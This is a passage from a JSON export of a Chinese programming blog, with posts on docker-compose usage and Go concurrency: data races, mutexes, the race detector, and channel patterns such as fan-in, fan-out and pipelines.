value of 128.redis-server_1 | 1:M 26 Feb 01:43:22.957 # Server initializedredis-server_1 | 1:M 26 Feb 01:43:22.957 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &apos;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&apos; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.redis-server_1 | 1:M 26 Feb 01:43:22.957 * Ready to accept connectionsnode-app_1 |node-app_1 | &gt; @ start /appnode-app_1 | &gt; node index.jsnode-app_1 |node-app_1 | Listening on port 8081 浏览器中访问 浏览器中访问网址：localhost:4001 利用docker-compose同时管理-释放多个container 开启之前的多个container docker-compose up -d 关闭： docker-compose down 当修改了文件后，更新重构： docker-compose up --build 查看状态：注意必须要在拥有docker-compose.yml的目录下。 docker-compose ps docker-compose 重启规则 “no” 永不重启 always 总是会重启 on-failure 出错代码才会重启 unless-stopped 一直会重启，除非开发者强制关闭，例如执行docker stop","categories":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/tags/docker/"}]},{"title":"golang[64]-同步和锁","slug":"golang-63-concurrentandlock","date":"2019-02-25T09:16:24.000Z","updated":"2019-02-25T15:00:17.365Z","comments":true,"path":"2019/02/25/golang-63-concurrentandlock/","link":"","permalink":"https://dreamerjonson.com/2019/02/25/golang-63-concurrentandlock/","excerpt":"","text":"Race Conditions 在某些情况下，如果并发的情况操作同一个变量可以会出现问题。 123456789101112131415161718192021222324252627282930313233// Package bank implements a bank with only one account.package bankvar balance intfunc Deposit(amount int) &#123; balance = balance + amount &#125;func Balance() int &#123; return balance &#125;考虑下面的情况：// Alice:go func() &#123;bank.Deposit(200) // A1fmt.Println(\"=\", bank.Balance()) // A2&#125;()// Bob:go bank.Deposit(100) // B//会发生非常严重单位问题，不同的顺序可能会导致不同的结果：// Alice first Bob first Alice/Bob/Alice// 0 0 0// A1 200 B 100 A1 200// A2 \"= 200\" A1 300 B 300// B 300 A2 \"= 300\" A2 \"= 300\"如果说第3中还能够保证金额的话，第4种可能性连金额都有问题// Data race// 0// A1r 0 ... = balance + amount// B 100// A1w 200 balance = ...// A2 \"= 200\" 定义 A data race occurs whenever two goroutines access the same variable concurrently and at least one of the accesses is a write. It follows from this definition that there are three ways to avoid a data race. 解决办法 1、不写数据，只读取数据 2、通过通道来通信，修改只限制在唯一的协程中。或者通过管道的方式，将数据限制在唯一的管道中。 3、互斥锁 互斥锁 第一种方式是通过1个buffle的管道，来达到互斥的目的。 1234567891011121314151617181920package bank//!+var ( sema = make(chan struct&#123;&#125;, 1) // a binary semaphore guarding balance balance int)func Deposit(amount int) &#123; sema &lt;- struct&#123;&#125;&#123;&#125; // acquire token balance = balance + amount &lt;-sema // release token&#125;func Balance() int &#123; sema &lt;- struct&#123;&#125;&#123;&#125; // acquire token b := balance &lt;-sema // release token return b&#125; 第二种方式是使用互斥锁：sync.Mutex 1234567891011121314151617181920212223package bank//!+import \"sync\"var ( mu sync.Mutex // guards balance balance int)func Deposit(amount int) &#123; mu.Lock() balance = balance + amount mu.Unlock()&#125;func Balance() int &#123; mu.Lock() b := balance mu.Unlock() return b&#125; 最好是使用defer，延迟释放 12345func Balance() int &#123;mu.Lock()defer mu.Unlock()return balance&#125; 只读锁 只能读，相对于互斥锁，速度更快。 1234567var mu sync.RWMutexvar balance intfunc Balance() int &#123;mu.RLock() // readers lockdefer mu.RUnlock()return balance&#125; 内存同步 你可能比较纠结为什么Balance方法需要用到互斥条件，无论是基于channel还是基于互斥量。毕竟和存款不一样，它只由一个简单的操作组成，所以不会碰到其它goroutine在其执行&quot;中&quot;执行其它的逻辑的风险。这里使用mutex有两方面考虑。第一Balance不会在其它操作比如Withdraw“中间”执行。第二(更重要)的是&quot;同步&quot;不仅仅是一堆goroutine执行顺序的问题；同样也会涉及到内存的问题。 在现代计算机中可能会有一堆处理器，每一个都会有其本地缓存(local cache)。为了效率，对内存的写入一般会在每一个处理器中缓冲，并在必要时一起flush到主存。这种情况下这些数据可能会以与当初goroutine写入顺序不同的顺序被提交到主存。像channel通信或者互斥量操作这样的原语会使处理器将其聚集的写入flush并commit，这样goroutine在某个时间点上的执行结果才能被其它处理器上运行的goroutine得到。 考虑一下下面代码片段的可能输出： var x, y int go func() { x = 1 // A1 fmt.Print(“y:”, y, &quot; &quot;) // A2 }() go func() { y = 1 // B1 fmt.Print(“x:”, x, &quot; &quot;) // B2 }() 因为两个goroutine是并发执行，并且访问共享变量时也没有互斥，会有数据竞争，所以程序的运行结果没法预测的话也请不要惊讶。我们可能希望它能够打印出下面这四种结果中的一种，相当于几种不同的交错执行时的情况： y:0 x:1 x:0 y:1 x:1 y:1 y:1 x:1 第四行可以被解释为执行顺序A1,B1,A2,B2或者B1,A1,A2,B2的执行结果。然而实际的运行时还是有些情况让我们有点惊讶： x:0 y:0 y:0 x:0 但是根据所使用的编译器，CPU，或者其它很多影响因子，这两种情况也是有可能发生的。那么这两种情况要怎么解释呢？ 在一个独立的goroutine中，每一个语句的执行顺序是可以被保证的；也就是说goroutine是顺序连贯的。但是在不使用channel且不使用mutex这样的显式同步操作时，我们就没法保证事件在不同的goroutine中看到的执行顺序是一致的了。尽管goroutine A中一定需要观察到x=1执行成功之后才会去读取y，但它没法确保自己观察得到goroutine B中对y的写入，所以A还可能会打印出y的一个旧版的值。 尽管去理解并发的一种尝试是去将其运行理解为不同goroutine语句的交错执行，但看看上面的例子，这已经不是现代的编译器和cpu的工作方式了。因为赋值和打印指向不同的变量，编译器可能会断定两条语句的顺序不会影响执行结果，并且会交换两个语句的执行顺序。如果两个goroutine在不同的CPU上执行，每一个核心有自己的缓存，这样一个goroutine的写入对于其它goroutine的Print，在主存同步之前就是不可见的了。 所有并发的问题都可以用一致的、简单的旣定的模式来规避。所以可能的话，将变量限定在goroutine内部；如果是多个goroutine都需要访问的变量，使用互斥条件来访问。 竞争条件检测 12345卽使我们小心到不能再小心，但在并发程序中犯错还是太容易了。幸运的是，Go的runtime和工具链为我们装备了一个复杂但好用的动态分析工具，竞争检查器(the race detector)。只要在go build，go run或者go test命令后面加上-race的flag，就会使编译器创建一个你的应用的“修改”版或者一个附带了能够记录所有运行期对共享变量访问工具的test ，并且会记录下每一个读或者写共享变量的goroutine的身份信息。另外，修改版的程序会记录下所有的同步事件，比如go语句，channel操作，以及对(*sync.Mutex).Lock，(*sync.WaitGroup).Wait等等的调用。(完整的同步事件集合是在The Go Memory Model文档中有说明，该文档是和语言文档放在一起的。译注：https://golang.org/ref/mem )竞争检查器会检查这些事件，会寻找在哪一个goroutine中出现了这样的case，例如其读或者写了一个共享变量，这个共享变量是被另一个goroutine在没有进行干预同步操作便直接写入的。这种情况也就表明了是对一个共享变量的并发访问，卽数据竞争。这个工具会打印一份报告，内容包含变量身份，读取和写入的goroutine中活跃的函数的调用栈。这些信息在定位问题时通常很有用。9.7节中会有一个竞争检查器的实战样例。竞争检查器会报告所有的已经发生的数据竞争。然而，它只能检测到运行时的竞争条件；并不能证明之后不会发生数据竞争。所以为了使结果尽量正确，请保证你的测试并发地覆盖到了你到包。由于需要额外的记录，因此构建时加了竞争检测的程序跑起来会慢一些，且需要更大的内存，卽时是这样，这些代价对于很多生产环境的工作来说还是可以接受的。对于一些偶发的竞争条件来说，让竞争检查器来干活可以节省无数日夜的debugging。(译注：多少服务端C和C艹程序员为此尽折腰)","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[6]-数据结构-斐波拉契数列","slug":"golang-6-structure-fib","date":"2019-02-24T05:37:21.000Z","updated":"2019-02-28T13:11:46.378Z","comments":true,"path":"2019/02/24/golang-6-structure-fib/","link":"","permalink":"https://dreamerjonson.com/2019/02/24/golang-6-structure-fib/","excerpt":"","text":"方法1 123456789101112131415161718192021222324252627282930package mainimport ( \"fmt\" \"time\")//!+func main() &#123; go spinner(100 * time.Millisecond) const n = 45 fibN := fib(n) // slow fmt.Printf(\"\\rFibonacci(%d) = %d\\n\", n, fibN)&#125;func spinner(delay time.Duration) &#123; for &#123; for _, r := range `-\\|/` &#123; fmt.Printf(\"\\r%c\", r) time.Sleep(delay) &#125; &#125;&#125;func fib(x int) int &#123; if x &lt; 2 &#123; return x &#125; return fib(x-1) + fib(x-2)&#125; 方法2 12345678// 1, 1, 2, 3, 5, 8, 13, ...func Fibonacci() func() int &#123; a, b := 0, 1 return func() int &#123; a, b = b, a+b return a &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[63]-concurrent并发荟萃","slug":"golang-63-concurrent","date":"2019-02-24T05:23:18.000Z","updated":"2019-03-31T07:52:28.054Z","comments":true,"path":"2019/02/24/golang-63-concurrent/","link":"","permalink":"https://dreamerjonson.com/2019/02/24/golang-63-concurrent/","excerpt":"","text":"goroutine 并发程序指的是同时做好几件事情的程序，随着硬件的发展，并发程序显得越来越重要。Web服务器会一次处理成千上万的请求。平板电脑和手机app在渲染用户动畵的同时，还会后台执行各种计算任务和网络请求。卽使是传统的批处理问题–读取数据，计算，写输出–现在也会用并发来隐藏掉I/O的操作延迟充分利用现代计算机设备的多核，尽管计算机的性能每年都在增长，但并不是线性。 Go语言中的并发程序可以用两种手段来实现。这一章会讲解goroutine和channel，其支持“顺序进程通信”(communicating sequential processes)或被简称为CSP。CSP是一个现代的并发编程模型，在这种编程模型中值会在不同的运行实例(goroutine)中传递，尽管大多数情况下被限制在单一实例中。第9章会覆盖到更为传统的并发模型：多线程共享内存，如果你在其它的主流语言中写过并发程序的话可能会更熟悉一些。第9章同时会讲一些本章不会深入的并发程序带来的重要风险和陷阱。 尽管Go对并发的支持是众多强力特性之一，但大多数情况下跟踪并发程序还是很困难，并且在线性程序中我们的直觉往往还会让我们误入歧途。如果这是你第一次接触并发，那么我推荐你稍微多花一些时间来思考这两个章节中的样例。 在Go语言中，每一个并发的执行单元叫作一个goroutine。设想这里有一个程序有两个函数，一个函数做一些计算，另一个输出一些结果，假设两个函数没有相互之间的调用关系。一个线性的程序会先调用其中的一个函数，然后再调用来一个，但如果是在有两个甚至更多个goroutine的程序中，对两个函数的调用就可以在同一时间。我们马上就会看到这样的一个程序。 如果你使用过操作系统或者其它语言提供的线程，那么你可以简单地把goroutine类比作一个线程，这样你就可以写出一些正确的程序了。goroutine和线程的本质区别会在9.8节中讲。 当一个程序启动时，其主函数卽在一个单独的goroutine中运行，我们叫它main goroutine。新的goroutine会用go语句来创建。在语法上，go语句是一个普通的函数或方法调用前加上关键字go。go语句会使其语句中的函数在一个新创建的goroutine中运行。而go语句本身会迅速地完成。 f() // call f(); wait for it to return go f() // create a new goroutine that calls f(); don’t wait 在下面的例子中，main goroutine会计算第45个菲波那契数。由于计算函数使用了效率非常低的递归，所以会运行相当可观的一段时间，在这期间我们想要让用户看到一个可见的标识来表明程序依然在正常运行，所以显示一个动畵的小图标： 12345678910111213141516171819202122func main() &#123; go spinner(100 * time.Millisecond) const n = 45 fibN := fib(n) // slow fmt.Printf(\"\\rFibonacci(%d) = %d\\n\", n, fibN)&#125;func spinner(delay time.Duration) &#123; for &#123; for _, r := range `-\\|/` &#123; fmt.Printf(\"\\r%c\", r) time.Sleep(delay) &#125; &#125;&#125;func fib(x int) int &#123; if x &lt; 2 &#123; return x &#125; return fib(x-1) + fib(x-2)&#125; 动畵显示了几秒之后，fib(45)的调用成功地返回，并且打印结果： Fibonacci(45) = 1134903170 然后主函数返回。当主函数返回时，所有的goroutine都会直接打断，程序退出。除了从主函数退出或者直接退出程序之外，没有其它的编程方法能够让一个goroutine来打断另一个的执行，但是我们之后可以看到，可以通过goroutine之间的通信来让一个goroutine请求请求其它的goroutine，并让其自己结束执行。 注意这里的两个独立的单元是如何进行组合的，spinning和菲波那契的计算。每一个都是写在独立的函数中，但是每一个函数都会并发地执行。 协程 开启1000个协程，等待1秒后主协程退出 123456789101112131415161718package mainimport ( \"fmt\" \"time\")func main() &#123; for i := 0; i &lt; 1000; i++ &#123; go func(i int) &#123; for &#123; fmt.Printf(\"Hello from \"+ \"goroutine %d\\n\", i) &#125; &#125;(i) &#125; time.Sleep(time.Millisecond)&#125; 检查协程中的竞争 12345678910111213141516171819package mainimport ( \"time\" \"fmt\")func main() &#123; var a [10]int for i := 0; i &lt; 10; i++ &#123; go func(i int) &#123; for &#123; a[i]++ &#125; &#125;(i) &#125; time.Sleep(time.Second) fmt.Println(a)&#125; 输出检查各个协程的工作： [268823720 278385441 259742710 274100267 206918978 216150917 212971051 204840248 201749853 209193197] 1go run -race goroutine.go 输出为： 123456789==================WARNING: DATA RACERead at 0x00c00001a0a0 by main goroutine: main.main() /Users/jackson/Documents/u2pppw/goroutine/goroutine.go:18 +0xfbPrevious write at 0x00c00001a0a0 by goroutine 6: main.main.func1() /Users/jackson/Documents/u2pppw/goroutine/goroutine.go:13 +0x64 一个陷阱 错误代码 12345678910111213141516171819package mainimport ( \"time\" \"fmt\")func main() &#123; var a [10]int for i := 0; i &lt; 10; i++ &#123; go func() &#123; for &#123; a[i]++ &#125; &#125;() &#125; time.Sleep(time.Second) fmt.Println(a)&#125; 上面的代码错误的原因是：panic: runtime error: index out of range 原因是现在的i的结果为10，超过了数组的限制。 Channels 如果说goroutine是Go语音程序的并发体的话，那么channels它们之间的通信机制。一个channels是一个通信机制，它可以让一个goroutine通过它给另一个goroutine发送值信息。每个channel都有一个特殊的类型，也就是channels可发送数据的类型。一个可以发送int类型数据的channel一般写为chan int。 使用内置的make函数，我们可以创建一个channel： ch := make(chan int) // ch has type ‘chan int’ 和map类似，channel也一个对应make创建的底层数据结构的引用。当我吗复制一个channel或用于函数参数传递时，我吗只是拷贝了一个channel引用，因此调用者何被调用者将引用同一个channel对象。和其它的引用类型一样，channel的零值也是nil。 两个相同类型的channel可以使用==运算符比较。如果两个channel引用的是相通的对象，那么比较的结果为眞。一个channel也可以和nil进行比较。 一个channel有发送和接受两个主要操作，都是通信行为。一个发送语句将一个值从一个goroutine通过channel发送到另一个执行接收操作的goroutine。发送和接收两个操作都是用&lt;-运算符。在发送语句中，&lt;-运算符分割channel和要发送的值。在接收语句中，&lt;-运算符写在channel对象之前。一个不使用接收结果的接收操作也是合法的。 ch &lt;- x // a send statement x = &lt;-ch // a receive expression in an assignment statement &lt;-ch // a receive statement; result is discarded Channel还支持close操作，用于关闭channel，随后对基于该channel的任何发送操作都将导致panic异常。对一个已经被close过的channel之行接收操作依然可以接受到之前已经成功发送的数据；如果channel中已经没有数据的话讲产生一个零值的数据。 使用内置的close函数就可以关闭一个channel： close(ch) 以最简单方式调用make函数创建的时一个无缓存的channel，但是我们也可以指定第二个整形参数，对应channel的容量。如果channel的容量大于零，那么该channel就是带缓存的channel。 ch = make(chan int) // unbuffered channel ch = make(chan int, 0) // unbuffered channel ch = make(chan int, 3) // buffered channel with capacity 3 我们将先讨论无缓存的channel，然后在8.4.4节讨论带缓存的channel。 最简单的协程与通道案例 1234567891011121314package mainfunc main() &#123; // create new channel of type int ch := make(chan int) // start new anonymous goroutine go func() &#123; // send 42 to channel ch &lt;- 42 &#125;() // read from channel &lt;-ch&#125; 不带缓存的Channels 一个基于无缓存Channels的发送操作将导致发送者goroutine阻塞，直到另一个goroutine在相同的Channels上执行接收操作，当发送的值通过Channels成功传输之后，两个goroutine可以继续执行后面的语句。反之，如果接收操作先发生，那么接收者goroutine也将阻塞，直到有另一个goroutine在相同的Channels上执行发送操作。 基于无缓存Channels的发送和接收操作将导致两个goroutine做一次同步操作。因为这个原因，无缓存Channels有时候也被称为同步Channels。当通过一个无缓存Channels发送数据时，接收者收到数据发生在唤醒发送者goroutine之前（译注：happens before，这是Go语言并发内存模型的一个关键术语！）。 在讨论并发编程时，当我们说x事件在y事件之前发生（happens before），我们并不是说x事件在时间上比y时间更早；我们要表达的意思是要保证在此之前的事件都已经完成了，例如在此之前的更新某些变量的操作已经完成，你可以放心依赖这些已完成的事件了。 当我们说x事件旣不是在y事件之前发生也不是在y事件之后发生，我们就说x事件和y事件是并发的。这并不是意味着x事件和y事件就一定是同时发生的，我们只是不能确定这两个事件发生的先后顺序。在下一章中我们将看到，当两个goroutine并发访问了相同的变量时，我们有必要保证某些事件的执行顺序，以避免出现某些并发问题。 在8.3节的客户端程序，它在主goroutine中（译注：就是执行main函数的goroutine）将标准输入复制到server，因此当客户端程序关闭标准输入时，后台goroutine可能依然在工作。我们需要让主goroutine等待后台goroutine完成工作后再退出，我们使用了一个channel来同步两个goroutine： 123456789101112131415func main() &#123; conn, err := net.Dial(\"tcp\", \"localhost:8000\") if err != nil &#123; log.Fatal(err) &#125; done := make(chan struct&#123;&#125;) go func() &#123; io.Copy(os.Stdout, conn) // NOTE: ignoring errors log.Println(\"done\") done &lt;- struct&#123;&#125;&#123;&#125; // signal the main goroutine &#125;() mustCopy(conn, os.Stdin) conn.Close() &lt;-done // wait for background goroutine to finish&#125; 当用户关闭了标准输入，主goroutine中的mustCopy函数调用将返回，然后调用conn.Close()关闭读和写方向的网络连接。关闭网络链接中的写方向的链接将导致server程序收到一个文件（end-of-ﬁle）结束的信号。关闭网络链接中读方向的链接将导致后台goroutine的io.Copy函数调用返回一个“read from closed connection”（“从关闭的链接读”）类似的错误，因此我们临时移除了错误日志语句；在练习8.3将会提供一个更好的解决方案。（需要注意的是go语句调用了一个函数字面量，这Go语言中启动goroutine常用的形式。） 在后台goroutine返回之前，它先打印一个日志信息，然后向done对应的channel发送一个值。主goroutine在退出前先等待从done对应的channel接收一个值。因此，总是可以在程序退出前正确输出“done”消息。 基于channels发送消息有两个重要方面。首先每个消息都有一个值，但是有时候通讯的事实和发生的时刻也同样重要。当我们更希望强调通讯发生的时刻时，我们将它称为消息事件。有些消息事件并不携带额外的信息，它仅仅是用作两个goroutine之间的同步，这时候我们可以用struct{}空结构体作为channels元素的类型，虽然也可以使用bool或int类型实现同样的功能，done &lt;- 1语句也比done &lt;- struct{}{}更短。 通道作为一等公民 作为参数和返回值 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( \"fmt\" \"time\")func worker(id int, c chan int) &#123; for n := range c &#123; fmt.Printf(\"Worker %d received %c\\n\", id, n) &#125;&#125;func createWorker(id int) chan&lt;- int &#123; c := make(chan int) go worker(id, c) return c&#125;func chanDemo() &#123; var channels [10]chan&lt;- int for i := 0; i &lt; 10; i++ &#123; channels[i] = createWorker(i) &#125; for i := 0; i &lt; 10; i++ &#123; channels[i] &lt;- 'a' + i &#125; for i := 0; i &lt; 10; i++ &#123; channels[i] &lt;- 'A' + i &#125; time.Sleep(time.Millisecond)&#125;func main()&#123; chanDemo()&#125; 构建一个简单的计时器 In fact, you can build a simple timer with this approach - create a channel, start goroutine which writes to this channel after given duration and returns this channel to the caller of your func. The caller then blocks on reading from the channel for the exact amount of time 12345678910111213141516171819package mainimport \"time\"func timer(d time.Duration) &lt;-chan int &#123; c := make(chan int) go func() &#123; time.Sleep(d) c &lt;- 1 &#125;() return c&#125;func main() &#123; for i := 0; i &lt; 24; i++ &#123; c := timer(1 * time.Second) &lt;-c &#125;&#125; Ping-pong 模式 This nice concurrency example was found in a great talk by googler Sameer Ajmani “Advanced Go Concurrency Patterns”. Of course, this pattern isn’t very advanced, but for those who only get themselves familiar with Go concurrency it may look quite fresh and interesting. Here we have a channel as a table of the ping-pong game. The ball is an integer variable, and two goroutines-players that ‘hit’ the ball, increasing its value (hits counter). 1234567891011121314151617181920212223package mainimport \"time\"func main() &#123; var Ball int table := make(chan int) go player(table) go player(table) table &lt;- Ball time.Sleep(1 * time.Second) &lt;-table&#125;func player(table chan int) &#123; for &#123; ball := &lt;-table ball++ time.Sleep(100 * time.Millisecond) table &lt;- ball &#125;&#125; Fan-In模式 扇入 多个入，抢夺一个通道出 1234567891011121314151617181920212223242526272829303132package mainimport ( \"fmt\" \"time\")func producer(ch chan int, d time.Duration) &#123; var i int for &#123; ch &lt;- i i++ time.Sleep(d) &#125;&#125;func reader(out chan int) &#123; for x := range out &#123; fmt.Println(x) &#125;&#125;func main() &#123; ch := make(chan int) out := make(chan int) go producer(ch, 100*time.Millisecond) go producer(ch, 250*time.Millisecond) go reader(out) for i := range ch &#123; out &lt;- i &#125;&#125; fan-out模式 1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( \"fmt\" \"sync\" \"time\")func worker(tasksCh &lt;-chan int, wg *sync.WaitGroup) &#123; defer wg.Done() for &#123; task, ok := &lt;-tasksCh if !ok &#123; return &#125; d := time.Duration(task) * time.Millisecond time.Sleep(d) fmt.Println(\"processing task\", task) &#125;&#125;func pool(wg *sync.WaitGroup, workers, tasks int) &#123; tasksCh := make(chan int) for i := 0; i &lt; workers; i++ &#123; go worker(tasksCh, wg) &#125; for i := 0; i &lt; tasks; i++ &#123; tasksCh &lt;- i &#125; close(tasksCh)&#125;func main() &#123; var wg sync.WaitGroup wg.Add(36) go pool(&amp;wg, 36, 50) wg.Wait()&#125; worker or fan-out模型 多个goroutines抢夺一个通道进行处理 The opposite pattern to fan-in is a fan-out or workers pattern. Multiple goroutines can read from a single channel, distributing an amount of work between CPU cores, hence the workers name. In Go, this pattern is easy to implement - just start a number of goroutines with channel as parameter, and just send values to that channel - distributing and multiplexing will be done by Go runtime, automagically 😃 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( \"fmt\" \"sync\" \"time\")func worker(tasksCh &lt;-chan int, wg *sync.WaitGroup) &#123; defer wg.Done() for &#123; task, ok := &lt;-tasksCh if !ok &#123; return &#125; d := time.Duration(task) * time.Millisecond time.Sleep(d) fmt.Println(\"processing task\", task) &#125;&#125;func pool(wg *sync.WaitGroup, workers, tasks int) &#123; tasksCh := make(chan int) for i := 0; i &lt; workers; i++ &#123; go worker(tasksCh, wg) &#125; for i := 0; i &lt; tasks; i++ &#123; tasksCh &lt;- i &#125; close(tasksCh)&#125;func main() &#123; var wg sync.WaitGroup wg.Add(36) go pool(&amp;wg, 36, 50) wg.Wait()&#125; 更复杂的fan-out模型 worker下面还有子worker 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package mainimport ( \"fmt\" \"sync\" \"time\")const ( WORKERS = 5 SUBWORKERS = 3 TASKS = 20 SUBTASKS = 10)func subworker(subtasks chan int) &#123; for &#123; task, ok := &lt;-subtasks if !ok &#123; return &#125; time.Sleep(time.Duration(task) * time.Millisecond) fmt.Println(task) &#125;&#125;func worker(tasks &lt;-chan int, wg *sync.WaitGroup) &#123; defer wg.Done() for &#123; task, ok := &lt;-tasks if !ok &#123; return &#125; subtasks := make(chan int) for i := 0; i &lt; SUBWORKERS; i++ &#123; go subworker(subtasks) &#125; for i := 0; i &lt; SUBTASKS; i++ &#123; task1 := task * i subtasks &lt;- task1 &#125; close(subtasks) &#125;&#125;func main() &#123; var wg sync.WaitGroup wg.Add(WORKERS) tasks := make(chan int) for i := 0; i &lt; WORKERS; i++ &#123; go worker(tasks, &amp;wg) &#125; for i := 0; i &lt; TASKS; i++ &#123; tasks &lt;- i &#125; close(tasks) wg.Wait()&#125; server Next common pattern is similar to fan-out, but with goroutines spawned for the short period of time, just to accomplish some task. It’s typically used for implementing servers - create a listener, run accept() in a loop and start goroutine for each accepted connection. It’s very expressive and allows to implement server handlers as simple as possible. Take a look at this simple example: 123456789101112131415161718192021222324package mainimport \"net\"func handler(c net.Conn) &#123; c.Write([]byte(\"ok\")) c.Close()&#125;func main() &#123; l, err := net.Listen(\"tcp\", \":5000\") if err != nil &#123; panic(err) &#125; for &#123; c, err := l.Accept() if err != nil &#123; continue &#125; go handler(c) &#125;&#125; It’s not very interesting - it seems there is nothing happens in terms of concurrency. Of course, under the hood there is a ton of complexity, which is deliberately hidden from us. “Simplicity is complicated”. But let’s go back to concurrency and add some interaction to our server. Let’s say, each handler wants to write asynchronously to the logger. Logger itself, in our example, is a separate goroutine which does the job. 改进server，写入log 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( \"fmt\" \"net\" \"time\")func handler(c net.Conn, ch chan string) &#123; ch &lt;- c.RemoteAddr().String() c.Write([]byte(\"ok\")) c.Close()&#125;func logger(ch chan string) &#123; for &#123; fmt.Println(&lt;-ch) &#125;&#125;func server(l net.Listener, ch chan string) &#123; for &#123; c, err := l.Accept() if err != nil &#123; continue &#125; go handler(c, ch) &#125;&#125;func main() &#123; l, err := net.Listen(\"tcp\", \":5000\") if err != nil &#123; panic(err) &#125; ch := make(chan string) go logger(ch) go server(l, ch) time.Sleep(10 * time.Second)&#125; Server + Worker Server with worker example is a bit advanced version of the logger. It not only does some work but sends the result of its work back to the pool using results channel. Not a big deal, but it extends our logger example to something more practical. Let’s see the code and animation: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package mainimport ( \"net\" \"time\")func handler(c net.Conn, ch chan string) &#123; addr := c.RemoteAddr().String() ch &lt;- addr time.Sleep(100 * time.Millisecond) c.Write([]byte(\"ok\")) c.Close()&#125;func logger(wch chan int, results chan int) &#123; for &#123; data := &lt;-wch data++ results &lt;- data &#125;&#125;func parse(results chan int) &#123; for &#123; &lt;-results &#125;&#125;func pool(ch chan string, n int) &#123; wch := make(chan int) results := make(chan int) for i := 0; i &lt; n; i++ &#123; go logger(wch, results) &#125; go parse(results) for &#123; addr := &lt;-ch l := len(addr) wch &lt;- l &#125;&#125;func server(l net.Listener, ch chan string) &#123; for &#123; c, err := l.Accept() if err != nil &#123; continue &#125; go handler(c, ch) &#125;&#125;func main() &#123; l, err := net.Listen(\"tcp\", \":5000\") if err != nil &#123; panic(err) &#125; ch := make(chan string) go pool(ch, 4) go server(l, ch) time.Sleep(10 * time.Second)&#125; 串联的Channels（Pipeline） Channels也可以用于将多个goroutine链接在一起，一个Channels的输出作为下一个Channels的输入。这种串联的Channels就是所谓的管道（pipeline）。下面的程序用两个channels将三个goroutine串联起来 第一个goroutine是一个计数器，用于生成0、1、2、……形式的整数序列，然后通过channel将该整数序列发送给第二个goroutine；第二个goroutine是一个求平方的程序，对收到的每个整数求平方，然后将平方后的结果通过第二个channel发送给第三个goroutine；第三个goroutine是一个打印程序，打印收到的每个整数。为了保持例子清晰，我们有意选择了非常简单的函数，当然三个goroutine的计算很简单，在现实中确实没有必要为如此​​简单的运算构建三个goroutine。 123456789101112131415161718192021222324func main() &#123; naturals := make(chan int) squares := make(chan int) // Counter go func() &#123; for x := 0; ; x++ &#123; naturals &lt;- x &#125; &#125;() // Squarer go func() &#123; for &#123; x := &lt;-naturals squares &lt;- x * x &#125; &#125;() // Printer (in main goroutine) for &#123; fmt.Println(&lt;-squares) &#125;&#125; 如您所料，上面的程序将生成0、1、4、9、……形式的无穷数列。像这样的串联Channels的管道（Pipelines）可以用在需要长时间运行的服务中，每个长时间运行的goroutine可能会包含一个死循环，在不同goroutine的死循环内部使用串联的Channels来通信。但是，如果我们希望通过Channels只发送有限的数列该如何处理呢？ 如果发送者知道，没有更多的值需要发送到channel的话，那么让接收者也能及时知道没有多余的值可接收将是有用的，因为接收者可以停止不必要的接收等待。这可以通过内置的close函数来关闭channel实现： close(naturals) 当一个channel被关闭后，再向该channel发送数据将导致panic异常。当一个被关闭的channel中已经发送的数据都被成功接收后，后续的接收操作将不再阻塞，它们会立卽返回一个零值。关闭上面例子中的naturals变量对应的channel并不能终止循环，它依然会收到一个永无休止的零值序列，然后将它们发送给打印者goroutine。 没有办法直接测试一个channel是否被关闭，但是接收操作有一个变体形式：它多接收一个结果，多接收的第二个结果是一个布尔值ok，ture表示成功从channels接收到值，false表示channels已经被关闭并且里面没有值可接收。使用这个特性，我们可以修改squarer函数中的循环代码，当naturals对应的channel被关闭并没有值可接收时跳出循环，并且也关闭squares对应的channel. 12345678910go func() &#123; for &#123; x, ok := &lt;-naturals if !ok &#123; break // channel was closed and drained &#125; squares &lt;- x * x &#125; close(squares)&#125;() 因为上面的语法是笨拙的，而且这种处理模式很常见，因此Go语言的range循环可直接在channels上面迭代。使用range循环是上面处理模式的简洁语法，它依次从channel接收数据，当channel被关闭并且没有值可接收时跳出循环 在下面的改进中，我们的计数器goroutine只生成100个含数字的序列，然后关闭naturals对应的channel，这将导致计算平方数的squarer对应的goroutine可以正常终止循环并关闭squares对应的channel。（在一个更复杂的程序中，可以通过defer语句关闭对应的channel。最后，主goroutine也可以正常终止循环并退出程序。 12345678910111213141516171819202122232425func main() &#123; naturals := make(chan int) squares := make(chan int) // Counter go func() &#123; for x := 0; x &lt; 100; x++ &#123; naturals &lt;- x &#125; close(naturals) &#125;() // Squarer go func() &#123; for x := range naturals &#123; squares &lt;- x * x &#125; close(squares) &#125;() // Printer (in main goroutine) for x := range squares &#123; fmt.Println(x) &#125;&#125; 其实你并不需要关闭每一个channel。只要当需要告诉接收者goroutine，所有的数据已经全部发送时才需要关闭channel。不管一个channel是否被关闭，当它没有被引用时将会被Go语言的垃圾自动回收器回收。（不要将关闭一个打开文件的操作和关闭一个channel操作混淆。对于每个打开的文件，都需要在不使用的使用调用对应的Close方法来关闭文件。） 视图重复关闭一个channel将导致panic异常，视图关闭一个nil值的channel也将导致panic异常。关闭一个channels还会触发一个广播机制，我们将在8.9节讨论。 并发求素数 1234567891011121314151617181920212223242526272829303132333435// A concurrent prime sievepackage mainimport \"fmt\"// Send the sequence 2, 3, 4, ... to channel 'ch'.func Generate(ch chan&lt;- int) &#123; for i := 2; ; i++ &#123; ch &lt;- i // Send 'i' to channel 'ch'. &#125;&#125;// Copy the values from channel 